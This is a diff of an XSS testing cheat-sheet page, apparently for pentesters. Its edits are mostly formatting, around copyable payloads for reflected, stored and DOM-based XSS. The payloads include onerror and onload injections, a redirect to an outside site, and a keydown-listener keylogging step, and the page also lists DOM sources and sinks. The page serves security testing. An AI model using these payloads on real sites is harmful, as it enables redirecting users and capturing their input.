@@ -45,8 +45,8 @@
 </details>	
 <details>
 <summary>REFLECTED TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate
-information, stole information, etc.
+<p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate information, 
+stole information, etc.
 <p><b>COMMON TESTS:</b>
 
 <b>C1: </b><mark id="RTA01">&lt;h1&gt;TEST&lt;/h1&gt;</mark>	
@@ -64,8 +64,8 @@ information, stole information, etc.
 <details>
 <summary>TEST VIA DEV TOOLS</summary>
 
-1. open dev tools in your browser
-2. type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>
+1. Open dev-tools in your browser
+2. Type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button>
 
@@ -75,7 +75,7 @@ information, stole information, etc.
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>
 
 <b><u>step2></u></b>$ <mark id="TDT05">document.addEventListener('keydown', logKey)</mark><br>
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C2.</button>
 	
 </details>
 </details>
@@ -84,7 +84,7 @@ information, stole information, etc.
 <p>DESCRIPTION: It is when data (exploit) is stored in the webpage without any restriction. So it can be used 
 to exploit any user that loads the vulnerable page.
 
-<b>NOTE:</b> 
+<b>NOTE:</b><br>
 1. First thing, check if the site allows guest user post or any input post to be stored. 
 	
 </details>
@@ -95,15 +95,14 @@ to exploit any user that loads the vulnerable page.
 
 1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;</mark>
 2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;</mark>
-3. <mark id="TDT08">&lt;svg onload=alert(1)&gt;</mark>
-4. <mark id="TDT09">&lt;img src=1 onerror=alert(1)&gt;</mark>
+3. <mark id="TDT08">&lt;svg onload=alert(1)&gt;</mark> | DOM for <u>document.write</u>
+4. <mark id="TDT09">&lt;img src=1 onerror='alert(XSS)'&gt;</mark> | DOM for <u>innerHTML</u>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT08')">.C3.</button><br>
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT09')">.C4.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT08')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT09')">.C4.</button>
 	
 </details>	
 
-<b>NOTE: </b>
+<b>NOTE: </b><br>
 Inspection of the code is needed 100%, <u>right click > inspect</u>. Look for javascript code that behaves with input information. 
 HTML sinks will retrieve HTML content that with manual inspection you can discover that, however, JS sinks will behave differently, 
 JS debugger is needed. 
@@ -115,11 +114,12 @@ going it means it is reflected or stored, if not, it means it is <b>DOM-BASED.</
 that takes data from possible vulnerable sources. [innerHTML / eval()] = sink
 
 <b>SOURCE =</b> Javascript properties that allows you to control input
+
 <b>Types:</b>
 	
 <b>document.URL / document.documentURI / document.URLUnencoded / document.baseURI / window.location / document.cookie / 
 document.referrer / window.name / history.pushState / history.replaceState / localStorage / sessionStorage
-IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) / Database</b>
+IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) / Database / location</b>
 	
 <b>SINK =</b> Potentially dangerous JavaScript function | [innerHTML / eval()]
 
